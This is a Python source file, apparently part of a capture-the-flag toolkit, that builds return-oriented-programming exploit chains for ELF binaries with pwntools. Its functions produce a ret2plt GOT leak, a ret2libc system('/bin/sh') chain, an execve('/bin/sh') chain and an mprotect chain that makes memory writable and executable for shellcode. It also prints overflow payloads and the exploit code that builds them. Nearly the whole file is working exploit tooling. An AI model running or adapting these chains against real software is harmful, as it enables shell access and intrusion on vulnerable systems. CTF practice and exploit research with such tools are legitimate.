"""ropchain: build the chain, print it as bytes and as the code that made it.

    ropchain ./vuln --leak                 # ret2plt puts leak, then return to main
    ropchain ./vuln --libc ./libc.so.6 --system
    ropchain ./vuln --execve               # static binaries: execve("/bin/sh")
    ropchain ./vuln --mprotect --offset 72
"""

from __future__ import annotations

import sys

from ctftools.core import gadgets as gadget_mod
from ctftools.core import term
from ctftools.core.binary import load_binary
from ctftools.core.cliutil import add_common_args, apply_output_flags, base_parser, fail, resolve_binary
from ctftools.core.report import Report


class ChainError(Exception):
    """A chain that cannot be built from what the binary offers."""


def _rop(path: str):
    from pwnlib.context import context
    from pwnlib.elf import ELF
    from pwnlib.rop import ROP

    context.clear()
    context.log_level = "critical"
    elf = ELF(path, checksec=False)
    context.binary = elf
    return elf, ROP(elf)


def leak_chain(info, leak_function: str = "puts", return_to: str = "main") -> tuple[bytes, str]:
    """Print a GOT entry through the PLT, then come back for a second payload."""
    elf, rop = _rop(info.path)

    if leak_function not in elf.plt and leak_function not in elf.sym:
        raise ChainError(f"{leak_function} is not imported; try --leak-with write or printf")
    target = elf.got.get(leak_function) or elf.got.get("puts")
    if target is None:
        raise ChainError("no GOT entry to leak; the binary may be statically linked")

    rop.raw(rop.find_gadget(["ret"]))
    getattr(rop, leak_function)(target)
    if return_to in elf.sym:
        rop.call(elf.sym[return_to])

    code = (
        "rop = ROP(exe)\n"
        "rop.raw(rop.find_gadget(['ret']))          # keep the stack 16 byte aligned\n"
        f"rop.{leak_function}(exe.got.{leak_function})\n"
        f"rop.call(exe.sym.{return_to})\n"
        "io.sendline(flat({OFFSET: rop.chain()}))\n"
        f"leak = u64(io.recvline().strip().ljust(8, b'\\x00'))\n"
        f"libc.address = leak - libc.sym.{leak_function}"
    )
    return rop.chain(), code


def system_chain(info, libc_path: str, leak: int | None = None,
                 leak_symbol: str = "puts") -> tuple[bytes, str]:
    """system("/bin/sh") in libc, using a leak to place the library."""
    from pwnlib.elf import ELF
    from pwnlib.rop import ROP

    elf, _ = _rop(info.path)
    libc = ELF(libc_path, checksec=False)

    if leak is not None:
        if leak_symbol not in libc.sym:
            raise ChainError(f"{leak_symbol} is not in {libc_path}")
        libc.address = leak - libc.sym[leak_symbol]
    else:
        libc.address = 0

    binsh = next(libc.search(b"/bin/sh\x00"), None)
    if binsh is None:
        raise ChainError("no /bin/sh string in that libc")

    rop = ROP(libc)
    rop.raw(rop.find_gadget(["ret"]))
    rop.system(binsh)

    code = (
        "libc = ELF('./libc.so.6')\n"
        f"libc.address = leak - libc.sym.{leak_symbol}\n"
        "rop = ROP(libc)\n"
        "rop.raw(rop.find_gadget(['ret']))\n"
        "rop.system(next(libc.search(b'/bin/sh\\x00')))\n"
        "io.sendline(flat({OFFSET: rop.chain()}))"
    )
    if leak is None:
        code = "# pass --leak-value <address> to resolve real addresses\n" + code
    return rop.chain(), code


def execve_chain(info, path: str = "/bin/sh") -> tuple[bytes, str]:
    """execve(path, 0, 0) from the binary's own gadgets, for static binaries."""
    elf, rop = _rop(info.path)

    existing = next(elf.search(path.encode() + b"\x00"), None)
    if existing is None:
        raise ChainError(
            f"no {path!r} string in the binary; write one into .bss first "
            "(a read(0, bss, 8) gadget chain), then rerun with --string-at <address>"
        )
    try:
        rop.execve(existing, 0, 0)
    except Exception as exc:
        raise ChainError(f"could not build an execve chain: {exc}")

    code = (
        "rop = ROP(exe)\n"
        f"binsh = next(exe.search(b'{path}\\x00'))\n"
        "rop.execve(binsh, 0, 0)\n"
        "io.sendline(flat({OFFSET: rop.chain()}))"
    )
    return rop.chain(), code


def mprotect_chain(info, page: int | None = None, size: int = 0x1000) -> tuple[bytes, str]:
    """Make a page writable and executable, for staged shellcode."""
    elf, rop = _rop(info.path)
    target = page if page is not None else (elf.bss() & ~0xFFF)
    try:
        rop.mprotect(target, size, 7)
    except Exception as exc:
        raise ChainError(f"could not build an mprotect chain: {exc}")

    code = (
        "rop = ROP(exe)\n"
        f"rop.mprotect({target:#x}, {size:#x}, 7)   # rwx\n"
        "rop.raw(shellcode_address)\n"
        "io.sendline(flat({OFFSET: rop.chain()}))"
    )
    return rop.chain(), code


def build(path: str, kind: str, offset: int | None = None, libc: str | None = None,
          leak: int | None = None, leak_with: str = "puts", bad: bytes = b"",
          string: str = "/bin/sh", page: int | None = None) -> Report:
    info = load_binary(path)
    report = Report(tool="ropchain", target=path)

    builders = {
        "leak": lambda: leak_chain(info, leak_with),
        "system": lambda: system_chain(info, libc, leak, leak_with),
        "execve": lambda: execve_chain(info, string),
        "mprotect": lambda: mprotect_chain(info, page),
    }
    if kind not in builders:
        raise ChainError(f"unknown chain {kind!r}")
    if kind == "system" and not libc:
        raise ChainError("--system needs --libc <path to libc.so.6>")

    chain, code = builders[kind]()

    offending = sorted({b for b in bad if b in chain})
    payload = (b"A" * offset + chain) if offset is not None else chain

    report.data.update({
        "chain_type": kind,
        "chain_length": len(chain),
        "chain_hex": chain.hex(),
        "payload_hex": payload.hex(),
        "offset": offset,
        "bad_bytes_present": [f"{b:#04x}" for b in offending],
        "code": code,
    })

    sec = report.section(f"{kind} chain")
    sec.add(f"  {len(chain)} bytes"
            + (f", payload {len(payload)} bytes with the {offset} byte filler" if offset is not None else ""))
    if info.pie:
        report.warn("the binary is PIE: these addresses are offsets until you set exe.address from a leak")
    if kind == "system" and leak is None:
        report.warn("no --leak-value given: libc addresses are offsets from 0")
    if offending:
        sec.add("  " + term.bad(f"contains bad bytes: {', '.join(f'{b:#04x}' for b in offending)}"))
    sec.add("")
    sec.add("  " + term.dim("raw:"))
    sec.add(f"    {chain.hex()}")

    listing = report.section("Chain")
    listing.add(_dump(chain, info))

    source = report.section("Code that builds it")
    for line in code.splitlines():
        source.add(f"    {line}")

    return report


def _dump(chain: bytes, info) -> str:
    """One line per stack slot, annotated where we can name the address."""
    word = info.word
    names = {}
    try:
        for name, addr in info.elf.symbols.items():
            names.setdefault(int(addr), str(name))
    except Exception:
        pass

    rows = []
    for index in range(0, len(chain) - word + 1, word):
        value = int.from_bytes(chain[index:index + word], "little")
        label = names.get(value, "")
        printable = chain[index:index + word]
        if not label and all(0x20 <= b < 0x7F for b in printable):
            label = repr(printable.decode())
        rows.append([f"+{index:04x}", f"{value:#0{word * 2 + 2}x}", term.dim(label)])
    return term.table(rows, headers=["Offset", "Value", "What"])


def build_parser():
    parser = base_parser("ropchain", "Build ret2plt, ret2libc, execve and mprotect chains.")
    parser.add_argument("binary", help="the ELF to build a chain for")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--leak", action="store_const", const="leak", dest="kind",
                       help="leak a GOT entry through the PLT and return to main")
    group.add_argument("--system", action="store_const", const="system", dest="kind",
                       help="call system(\"/bin/sh\") in libc (needs --libc)")
    group.add_argument("--execve", action="store_const", const="execve", dest="kind",
                       help="execve(\"/bin/sh\", 0, 0) from the binary's own gadgets")
    group.add_argument("--mprotect", action="store_const", const="mprotect", dest="kind",
                       help="make a page rwx for staged shellcode")
    parser.add_argument("--offset", type=int, help="prepend this many filler bytes to make a full payload")
    parser.add_argument("--libc", help="path to the challenge libc")
    parser.add_argument("--leak-value", type=lambda v: int(v, 0), dest="leak",
                        help="an address already leaked, used to place libc")
    parser.add_argument("--leak-with", default="puts", help="function used for the leak (default: puts)")
    parser.add_argument("--bad", default="", help="bad bytes as hex; the chain is checked against them")
    parser.add_argument("--string", default="/bin/sh", help="string to execve (default: /bin/sh)")
    parser.add_argument("--page", type=lambda v: int(v, 0), help="page address for --mprotect")
    parser.add_argument("--raw", action="store_true", help="write the raw chain to stdout and nothing else")
    add_common_args(parser)
    return parser


def main(argv=None) -> int:
    args = build_parser().parse_args(argv)
    apply_output_flags(args)

    try:
        bad = bytes.fromhex(args.bad.replace("0x", "").replace("\\x", "").replace(" ", ""))
    except ValueError:
        fail(f"--bad must be hex, got {args.bad!r}")

    try:
        report = build(
            resolve_binary(args.binary), args.kind, offset=args.offset, libc=args.libc,
            leak=args.leak, leak_with=args.leak_with, bad=bad, string=args.string, page=args.page,
        )
    except ChainError as exc:
        fail(str(exc))

    if args.raw:
        sys.stdout.buffer.write(bytes.fromhex(report.data["payload_hex"]))
        return 0

    report.emit(as_json=args.json)
    return 1 if report.data.get("bad_bytes_present") else 0


if __name__ == "__main__":
    sys.exit(main())
